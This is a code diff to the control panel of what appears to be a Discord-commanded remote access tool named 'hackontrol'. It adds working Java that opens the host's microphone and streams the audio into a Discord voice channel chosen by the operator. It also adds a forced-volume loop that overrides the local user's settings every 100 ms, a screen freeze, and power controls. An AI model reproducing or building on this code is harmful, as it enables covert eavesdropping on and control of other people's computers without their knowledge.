@@ -1,5 +1,15 @@
 package com.khopan.hackontrol.panel;
 
+import java.nio.ByteBuffer;
+import java.util.List;
+import java.util.concurrent.Executors;
+import java.util.concurrent.TimeUnit;
+
+import javax.sound.sampled.AudioInputStream;
+import javax.sound.sampled.AudioSystem;
+import javax.sound.sampled.DataLine.Info;
+import javax.sound.sampled.TargetDataLine;
+
 import com.khopan.hackontrol.handler.KeyboardHandler;
 import com.khopan.hackontrol.manager.interaction.ButtonContext;
 import com.khopan.hackontrol.manager.interaction.ButtonManager;
@@ -7,13 +17,21 @@ import com.khopan.hackontrol.manager.interaction.ButtonManager.ButtonType;
 import com.khopan.hackontrol.manager.interaction.Question;
 import com.khopan.hackontrol.manager.interaction.Question.QuestionType;
 import com.khopan.hackontrol.nativelibrary.Kernel;
+import com.khopan.hackontrol.nativelibrary.User;
 import com.khopan.hackontrol.registry.Registration;
+import com.khopan.hackontrol.utils.HackontrolError;
 import com.khopan.hackontrol.utils.HackontrolMessage;
-import com.khopan.hackontrol.utils.Microphone;
-import com.khopan.hackontrol.utils.Sound;
+import com.khopan.hackontrol.utils.sendable.ISendable;
 import com.khopan.hackontrol.widget.ControlWidget;
 
+import net.dv8tion.jda.api.audio.AudioSendHandler;
+import net.dv8tion.jda.api.entities.Guild;
+import net.dv8tion.jda.api.entities.channel.concrete.VoiceChannel;
 import net.dv8tion.jda.api.interactions.components.buttons.Button;
+import net.dv8tion.jda.api.interactions.components.text.TextInput;
+import net.dv8tion.jda.api.interactions.components.text.TextInputStyle;
+import net.dv8tion.jda.api.interactions.modals.Modal;
+import net.dv8tion.jda.api.managers.AudioManager;
 
 public class ControlPanel extends Panel {
 	private static final String PANEL_NAME = "control";
@@ -36,13 +54,14 @@ public class ControlPanel extends Panel {
 
 	private static final Button BUTTON_PROCESS_LIST          = ButtonManager.staticButton(ButtonType.SUCCESS,   "Process List", "listProcess");
 
-	private final Microphone microphone;
-	private final Sound sound;
+	private static final String MODAL_CHANGE_VOLUME          = "modalVolumeChange";
 
-	public ControlPanel() {
-		this.microphone = new Microphone();
-		this.sound = new Sound();
-	}
+	private volatile float volume;
+	private volatile boolean volumeMute;
+	private volatile boolean volumeForceMode;
+
+	private SendHandler sendHandler;
+	private AudioManager audioManager;
 
 	@Override
 	public String panelName() {
@@ -55,17 +74,42 @@ public class ControlPanel extends Panel {
 		this.register(Registration.BUTTON, ControlPanel.BUTTON_HIBERNATE,             context -> Question.positive(context.reply(), "Are you sure you want to hibernate?", QuestionType.YES_NO, Kernel :: hibernate));
 		this.register(Registration.BUTTON, ControlPanel.BUTTON_RESTART,               context -> Question.positive(context.reply(), "Are you sure you want to restart?",   QuestionType.YES_NO, Kernel :: restart));
 		this.register(Registration.BUTTON, ControlPanel.BUTTON_SHUTDOWN,              context -> Question.positive(context.reply(), "Are you sure you want to shutdown?",  QuestionType.YES_NO, Kernel :: shutdown));
-		this.register(Registration.BUTTON, ControlPanel.BUTTON_VOLUME,                this.sound :: volume);
-		this.register(Registration.BUTTON, ControlPanel.BUTTON_MICROPHONE_CONNECT,    this.microphone :: connect);
-		this.register(Registration.BUTTON, ControlPanel.BUTTON_MICROPHONE_DISCONNECT, this.microphone :: disconnect);
-		this.register(Registration.BUTTON, ControlPanel.BUTTON_MUTE,                  this.sound :: mute);
-		this.register(Registration.BUTTON, ControlPanel.BUTTON_UNMUTE,                this.sound :: unmute);
-		this.register(Registration.BUTTON, ControlPanel.BUTTON_FORCE,                 this.sound :: force);
-		this.register(Registration.BUTTON, ControlPanel.BUTTON_UNFORCE,               this.sound :: unforce);
-		this.register(Registration.BUTTON, ControlPanel.BUTTON_SCREEN_FREEZE,         context -> this.buttonFreeze(context, true));
-		this.register(Registration.BUTTON, ControlPanel.BUTTON_SCREEN_UNFREEZE,       context -> this.buttonFreeze(context, false));
+		this.register(Registration.BUTTON, ControlPanel.BUTTON_VOLUME,                context -> context.replyModal(Modal.create(ControlPanel.MODAL_CHANGE_VOLUME, "New Volume").addActionRow(TextInput.create("volume", "Volume", TextInputStyle.SHORT).setRequired(true).setMinLength(1).setMaxLength(3).setPlaceholder("0 - 100").setValue(Integer.toString(Math.min(Math.max((int) Math.round(((double) (this.volumeForceMode ? this.volume : User.getMasterVolume())) * 100.0d), 0), 100))).build()).build()).queue());
+		this.register(Registration.BUTTON, ControlPanel.BUTTON_MICROPHONE_CONNECT,    context -> this.connect(context, true));
+		this.register(Registration.BUTTON, ControlPanel.BUTTON_MICROPHONE_DISCONNECT, context -> this.connect(context, false));
+		this.register(Registration.BUTTON, ControlPanel.BUTTON_MUTE,                  context -> this.mute(context, true));
+		this.register(Registration.BUTTON, ControlPanel.BUTTON_UNMUTE,                context -> this.mute(context, false));
+		this.register(Registration.BUTTON, ControlPanel.BUTTON_FORCE,                 context -> this.forceMode(context, true));
+		this.register(Registration.BUTTON, ControlPanel.BUTTON_UNFORCE,               context -> this.forceMode(context, false));
+		this.register(Registration.BUTTON, ControlPanel.BUTTON_SCREEN_FREEZE,         context -> this.freeze(context, true));
+		this.register(Registration.BUTTON, ControlPanel.BUTTON_SCREEN_UNFREEZE,       context -> this.freeze(context, false));
 		this.register(Registration.BUTTON, ControlPanel.BUTTON_PROCESS_LIST,          context -> {});
-		this.register(Registration.MODAL,  Sound.MODAL_IDENTIFIER,                    this.sound :: volumeModal);
+		this.register(Registration.MODAL,  ControlPanel.MODAL_CHANGE_VOLUME,          context -> {
+			String text = context.getValue("volume").getAsString();
+			int volumeLevel;
+
+			try {
+				volumeLevel = Integer.parseInt(text);
+			} catch(Throwable Errors) {
+				HackontrolError.message(context.reply(), "Invalid number format");
+				return;
+			}
+
+			if(volumeLevel < 0 || volumeLevel > 100) {
+				HackontrolError.message(context.reply(), "Volume out of bounds, expected 0 - 100");
+				return;
+			}
+
+			float volume = ((float) volumeLevel) / 100.0f;
+
+			if(this.volumeForceMode) {
+				this.volume = volume;
+			} else {
+				User.setMasterVolume(volume);
+			}
+
+			context.deferEdit().queue();
+		});
 	}
 
 	@Override
@@ -95,26 +139,171 @@ public class ControlPanel extends Panel {
 
 	@Override
 	public void initialize() {
-		this.sound.initialize();
+		Executors.newSingleThreadScheduledExecutor().scheduleAtFixedRate(() -> {
+			if(!this.volumeForceMode) {
+				return;
+			}
+
+			if(User.getMasterVolume() != this.volume) {
+				User.setMasterVolume(this.volume);
+			}
+
+			if(User.isMute() != this.volumeMute) {
+				User.setMute(this.volumeMute);
+			}
+		}, 0, 100, TimeUnit.MILLISECONDS);
 	}
 
-	private void buttonFreeze(ButtonContext context, boolean freeze) {
+	private void connect(ButtonContext context, boolean connect) {
+		if((this.sendHandler == null) != connect) {
+			HackontrolMessage.boldDeletable(context.reply(), "Microphone is already " + (connect ? "connected" : "disconnected"));
+			return;
+		}
+
+		Guild guild = context.getGuild();
+
+		if(connect) {
+			try {
+				if(this.connectVoice(guild, context.reply(), true)) {
+					context.deferEdit().queue();
+				}
+			} catch(Throwable Errors) {
+				HackontrolError.throwable(context.message(), Errors);
+			}
+
+			return;
+		}
+
+		Question.positive(context.reply(), "Are you sure you want to disconnect?", QuestionType.YES_NO, () -> {
+			try {
+				this.connectVoice(guild, context.message(), false);
+			} catch(Throwable Errors) {
+				HackontrolError.throwable(context.message(), Errors);
+			}
+		});
+	}
+
+	private boolean connectVoice(Guild guild, ISendable sender, boolean connect) throws Throwable {
+		if(this.audioManager == null) {
+			this.audioManager = guild.getAudioManager();
+		}
+
+		this.audioManager.closeAudioConnection();
+
+		if(this.sendHandler != null) {
+			this.sendHandler.close();
+			this.sendHandler = null;
+		}
+
+		if(!connect) {
+			return true;
+		}
+
+		VoiceChannel channel = guild.getVoiceChannelById(1257651662869368864L);
+
+		if(channel == null) {
+			List<VoiceChannel> list = guild.getVoiceChannels();
+
+			if(!list.isEmpty()) {
+				channel = list.get(0);
+			}
+		}
+
+		if(channel == null) {
+			HackontrolError.message(sender, "No voice channels were found");
+			return false;
+		}
+
+		this.sendHandler = new SendHandler();
+		this.audioManager.setSendingHandler(this.sendHandler);
+		this.audioManager.setSelfDeafened(true);
+		this.audioManager.openAudioConnection(channel);
+		return true;
+	}
+
+	private void mute(ButtonContext context, boolean mute) {
+		if((this.volumeForceMode ? this.volumeMute : User.isMute()) == mute) {
+			HackontrolMessage.boldDeletable(context.reply(), "Volume is already " + (mute ? "muted" : "unmuted"));
+			return;
+		}
+
+		if(!mute) {
+			Question.positive(context.reply(), "Are you sure you want to unmute?", QuestionType.YES_NO, () -> User.setMute(this.volumeMute = false));
+			return;
+		}
+
+		User.setMute(this.volumeMute = true);
+		context.deferEdit().queue();
+	}
+
+	private void forceMode(ButtonContext context, boolean enable) {
+		if(this.volumeForceMode == enable) {
+			HackontrolMessage.boldDeletable(context.reply(), "Force mode is already " + (enable ? "enabled" : "disabled"));
+			return;
+		}
+
+		if(!enable) {
+			Question.positive(context.reply(), "Are you sure you want to disable force mode?", QuestionType.YES_NO, () -> this.volumeForceMode = false);
+			return;
+		}
+
+		this.volume = User.getMasterVolume();
+		this.volumeMute = User.isMute();
+		this.volumeForceMode = true;
+		context.deferEdit().queue();
+	}
+
+	private void freeze(ButtonContext context, boolean freeze) {
 		if(KeyboardHandler.Freeze == freeze) {
 			HackontrolMessage.boldDeletable(context.reply(), "The screen is already " + (freeze ? "frozen" : "unfrozen"));
 			return;
 		}
 
 		if(!freeze) {
-			Question.positive(context.reply(), "Are you sure you want to unfreeze the screen?", QuestionType.YES_NO, () -> this.freeze(false));
+			Question.positive(context.reply(), "Are you sure you want to unfreeze the screen?", QuestionType.YES_NO, () -> Kernel.setFreeze(KeyboardHandler.Freeze = false));
 			return;
 		}
 
-		this.freeze(true);
+		Kernel.setFreeze(KeyboardHandler.Freeze = true);
 		context.deferEdit().queue();
 	}
 
-	private void freeze(boolean freeze) {
-		KeyboardHandler.Freeze = freeze;
-		Kernel.setFreeze(freeze);
+	private class SendHandler implements AudioSendHandler {
+		private final TargetDataLine line;
+		private final AudioInputStream stream;
+		private final int size;
+
+		private volatile boolean open;
+
+		private SendHandler() throws Throwable {
+			Info info = new Info(TargetDataLine.class, AudioSendHandler.INPUT_FORMAT);
+			this.line = (TargetDataLine) AudioSystem.getLine(info);
+			this.line.open();
+			this.line.start();
+			this.stream = new AudioInputStream(this.line);
+			this.size = Math.round(AudioSendHandler.INPUT_FORMAT.getSampleRate() * 0.02f * ((float) AudioSendHandler.INPUT_FORMAT.getChannels()) * ((float) AudioSendHandler.INPUT_FORMAT.getSampleSizeInBits()) * 0.125f);
+			this.open = true;
+		}
+
+		@Override
+		public boolean canProvide() {
+			return this.open;
+		}
+
+		@Override
+		public ByteBuffer provide20MsAudio() {
+			try {
+				return ByteBuffer.wrap(this.stream.readNBytes(this.size));
+			} catch(Throwable Errors) {
+				return ByteBuffer.allocate(0);
+			}
+		}
+
+		private void close() throws Throwable {
+			this.open = false;
+			this.line.stop();
+			this.line.close();
+			this.stream.close();
+		}
 	}
 }
